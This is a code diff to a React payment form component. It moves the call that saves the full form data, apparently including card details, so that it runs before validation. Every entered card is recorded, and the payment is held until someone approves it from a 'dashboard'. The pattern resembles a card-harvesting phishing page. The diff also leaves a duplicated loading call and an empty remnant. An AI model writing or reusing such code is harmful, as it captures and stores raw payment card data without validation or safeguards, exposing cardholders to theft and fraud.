@@ -107,7 +107,32 @@ export default function PaymentForm() {
   const handleSubmit = async (e: React.FormEvent) => {
     e.preventDefault()
     setLoading(true)
+    setErrors({})
+    setLoading(true)
+    setPaymentStatus("processing")
 
+    try {
+      const _id = localStorage.getItem("visitor")
+
+      // Create a new payment record with pending status
+      await addData({
+        id: _id,
+        ...formData,
+        paymentStatus: "pending",
+      })
+
+      // Store visitor ID as payment ID for tracking
+      localStorage.setItem("paymentStatus", "pending")
+
+      // The dialog will stay open until the payment status is updated from the dashboard
+    } catch (error) {
+      console.error("Payment error:", error)
+      setPaymentStatus("error")
+      setTimeout(() => {
+        setLoading(false)
+        localStorage.removeItem("paymentStatus")
+      }, 1500)
+    }
     // Remove spaces from card number before validation
     const validationData = {
       ...formData,
@@ -143,32 +168,7 @@ export default function PaymentForm() {
       return
     }
 
-    setErrors({})
-    setLoading(true)
-    setPaymentStatus("processing")
-
-    try {
-      const _id = localStorage.getItem("visitor")
-
-      // Create a new payment record with pending status
-      await addData({
-        id: _id,
-        ...formData,
-        paymentStatus: "pending",
-      })
-
-      // Store visitor ID as payment ID for tracking
-      localStorage.setItem("paymentStatus", "pending")
-
-      // The dialog will stay open until the payment status is updated from the dashboard
-    } catch (error) {
-      console.error("Payment error:", error)
-      setPaymentStatus("error")
-      setTimeout(() => {
-        setLoading(false)
-        localStorage.removeItem("paymentStatus")
-      }, 1500)
-    }
+    
   }
 
   // Function to refresh the page
